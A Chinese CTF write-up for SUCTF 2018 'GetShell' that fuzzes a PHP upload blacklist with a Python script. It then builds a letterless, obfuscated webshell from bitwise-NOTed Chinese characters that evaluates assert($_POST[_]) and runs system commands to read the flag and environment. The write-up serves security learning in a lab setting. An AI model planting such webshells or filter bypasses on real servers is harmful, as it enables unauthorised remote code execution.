---
title: '[SUCTF 2018]GetShell'
date: 2024-07-13 16:31:37
tags: rce
categories: 刷题笔记
---

## [SUCTF 2018]GetShell（无字母数字rce）

我们打开页面源码，发现源码里有个链接

![image-20240715194012415](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407151940546.png)

我们点击后跳转到了新的页面，并发现了一串代码

<!--more-->

```
if($contents=file_get_contents($_FILES["file"]["tmp_name"])){
    $data=substr($contents,5);
    foreach ($black_char as $b) {
        if (stripos($data, $b) !== false){
            die("illegal char");
        }
    }     
} 
```

进行简单的代码审计，意思就是先读取文件中的内容，然后从第五位开始进行黑名单过滤，但我们不知道$black_char里面是什么，所以我们需要进行fuzz

网上找的一个脚本

```
# -*- coding:utf-8 -*-
# Author: m0c1nu7
import requests

def ascii_str():
	str_list=[]
	for i in range(33,127):
		str_list.append(chr(i))
	#print('可显示字符：%s'%str_list)
	return str_list

def upload_post(url):
	str_list = ascii_str()
	for str in str_list:
		header = {
		'Host':'3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Accept-Encoding':'gzip, deflate',
		'Content-Type':'multipart/form-data; boundary=---------------------------339469688437537919752303518127'
		}
		post = '''-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

12345'''+str+'''
-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="submit"

提交			
-----------------------------339469688437537919752303518127--'''

		res = requests.post(url,data=post.encode('UTF-8'),headers=header)
		if 'Stored' in res.text:
			print("该字符可以通过:  {0}".format(str))
		else:
			print("过滤字符:  {0}".format(str))
			


if __name__ == '__main__':
	url = 'http://3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn/index.php?act=upload'
	upload_post(url)

```

测试过后，我们发现`$`、`(`、`)`、`.`、`;`、`=`、`[`、`]`、`_`、`~`，然后就是汉字没有被过滤，所以这题考的是无字母数字rce

我们异或汉字来获取想要的字母，对大量汉字进行`fuzz`测试

```
<?php
//Author: m0c1nu7 
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');

function str_split_unicode($str, $l = 0) {
 
    if ($l > 0) {
        $ret = array();
        $len = mb_strlen($str, "UTF-8");
        for ($i = 0; $i < $len; $i += $l) {
            $ret[] = mb_substr($str, $i, $l, "UTF-8");
        }
        return $ret;
    }
    return preg_split("//u", $str, -1, PREG_SPLIT_NO_EMPTY);
}
 
$s = '你归来是诗离去成词且笑风尘不敢造次我糟糠能食粗衣也认煮酒话桑不敢相思你终会遇见这么一个人他会用整个人生将你精心收藏用漫长岁月把你妥善安放怕什么岁月漫长你心地善良,终会有一人陪你骑马喝酒走四方为你唱一首歌歌中有你亦有我我的泪我的魅将都融入到我的歌声里飘向孤独的你你是否听到了我的歌曲是否也在黯然落泪？岁月匆匆人生漫漫漠视了真情谁是站谁的谁已经变得不重要至少曾经已拥有长相思爱相随时空隔离谁相陪？花前月下心随风相思一片梦成空笑看往事红尘中多少凝思付清秋？长相思泪相随曾经谁是谁的谁？孤星冷月泪盈盈念曾经相逢心长时光短让人垂泪到天明长相思苦相随窗前双燕比翼飞日暮情人成双对于时光无垠的田野中没有早一步也没有晚一步恰好遇见了想要遇见的人这是一段多少美丽而令人心动的尘缘于爱情来说相见恨早会恨晚站会留下梨花带雨的疼痛而于友情来说无论太早或者太迟都是一份值得珍惜的情缘晚秋缓缓走晚了我的轮回疏雨一刻半疏笼起我深深的梦馀昨日遗憾寸寸疏雨挑涸泪烛落笔无处飒晚秋彼晚秋未晚懒我疏雨疏风去归我初心还我清梦唯我在晚秋未晚里守望那疏雨半疏的麦田待下一片梧桐叶复舞我亦拾起我的旧梦旧梦清寒一枕乱我眸中晚秋躞蹀的雨疏疏拍窗我的晚秋疏雨半疏疏开昨日我的梦情缘如海深邃澈蓝干涸成妄谈一湛清湖泪潸然一颦寒眉锁阑珊只为你而欣悦只因你而清泪斑斑你是我的前世吧为何沁泊在我的心怀缱绻起涟波千层驻我心扉知我情怀从此我已习惯你的嘘寒问暖懒倦地痴卧在你的胸怀红霞满腮昨天再苦都要用今天的微笑把它吟咏成一段幸福的记忆；曾经再累都要用当站下的遗忘穿越万道红尘让心波澜不惊人生最大的荣耀不在于从不跌倒而在于每一次跌倒后都能爬起来回忆是件很累的事就像失眠时怎么躺都不对的样子有时候往往直到离开在回忆里才能知道自己有多喜欢一座城';

$arr_str=str_split_unicode($s);

for ($i=0; $i < strlen($s) ; $i++) { 
	echo $arr_str[$i].' ------- '.~$arr_str[$i][1].'<br>';
}
 
 ?>

```

然后构造shell

```
<?php 
$__ = [];
$_ = ($__ == $__);//$_ = 1
$__ = ~(融);
$___ = $__[$_];//a
$__ = ~(匆);
$___ .= $__[$_].$__[$_];//ass
$__ = ~(随);
$___ .= $__[$_];//asse
$__ = ~(千);
$___ .= $__[$_];//asser
$__ = ~(苦);
$___ .= $__[$_];//assert
$____ = ~(~(_));//_
$__ = ~(诗);
$____ .= $__[$_];//_P
$__ = ~(尘);
$____ .= $__[$_];//_PO
$__ = ~(欣);
$____ .= $__[$_];//_POS
$__ = ~(站);
$____ .= $__[$_];//_POST
$_=$$____;//$_POST
$___($_[_]);//assert($_POST[_])

```

记得把注释删去

上传成功后我们访问上传路径，post一个_=phpinfo()

![image-20240715200330194](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152003425.png)

成功执行

输入，得到一个flag，但由于buu的环境问题，这个flag并不是这道题的flag

```
_=system("cd /;ls;cat Th1s_14_f14g");


```

![image-20240715200446559](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152004621.png)

我们访问环境变量，得到这道题的flag

```
_=system(env);
```

![image-20240715200603090](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152006271.png)
